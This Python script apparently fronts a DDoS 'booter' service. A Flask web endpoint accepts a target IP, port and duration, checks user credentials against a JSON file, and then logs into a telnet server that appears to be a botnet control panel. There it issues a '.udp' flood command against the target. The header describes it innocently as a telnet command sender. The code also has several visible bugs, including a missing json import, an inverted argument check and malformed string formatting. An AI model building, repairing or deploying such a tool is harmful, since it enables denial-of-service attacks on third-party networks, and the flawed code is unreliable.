import requests, telnetlib, os, time, flask
from flask import *

#! Created by NoelP
#! Version 1.0
#! Date: 09/08/2022
#! Description: This is a simple python script that will allow you to send commands to a telnet server.
#? All Rights Reserved. Use of this script is subject to the terms of the license agreement.

class API:
    host = "0.0.0.0"
    port = 80
    def validate(username, password): #* You could in theory change this entire function to your own SQL database. This is just proof-of-concept
        with open("db.json") as f:
            for entry in json.load(f):
                if entry["username"] == username and entry["password"] == password:
                    return True
            else:
                return False

    def run():
        app = flask.Flask('API')
        @app.route("/")
        def index():
            host, port, username, password, time = request.args.get('host'), request.args.get('port'), request.args.get('username'), request.args.get('password'), request.args.get('time')
            if not host or port or username or password or time:
                return("Missing arguments", 422)
            if not API.validate(username, password):
                return("Invalid credentials", 401)
            if not Attributes.submit(username, password, host, time, port):
                return("Failed to submit", 500)
            else:
                return("Successfully Sent", 200)
        app.run(host=API.host, port=API.port)

class Attributes:
    def __init__(self): #! Change these variables to change the destination server.
        self.host = "CHANGEME"
        self.port = 23

    #? Assuming the username and passwords have been checked alreaady
    def submit(self, username, password, ip, duration, port):
        try:
            with telnetlib.Telnet(host=self.host, port=self.port, timeout=10) as t:
                #t.set_debuglevel(2)
                print("[Sucessfully connected to Telnet Server] - [Sending credentials]")
                ###? The reason i use this method is because it's using a third party login script. Not using read_until() because target server uses RGB text
                t.write(b"\r\n%s\r\n%s\r\n" % username, password) #! Logging in

                ###? Below here you can execute all commands you desire.
                t.write(b'.udp %s %s dport=%s\r\n'% ip, duration, port)
                t.write(b'exit') #! Exit the telnet session.
                #print(t.read_all()) #! Only uncomment for debugging purposes.
                return True
        except ConnectionRefusedError: #* The reason this is here is because the server is not always online.
            print("[Connection Refused] - Server is offline.")
            return False
        except Exception as E: #* If no other conditions are met.
            print("[Unknown Error] - Please report this to the developer. Error: %s" % E)
            return False

if __name__ == "__main__":
    if os.name == 'nt':
        os.system('title [NoelP] - Telnet Client Connector')
    API.run() #! Starts the Flask Server
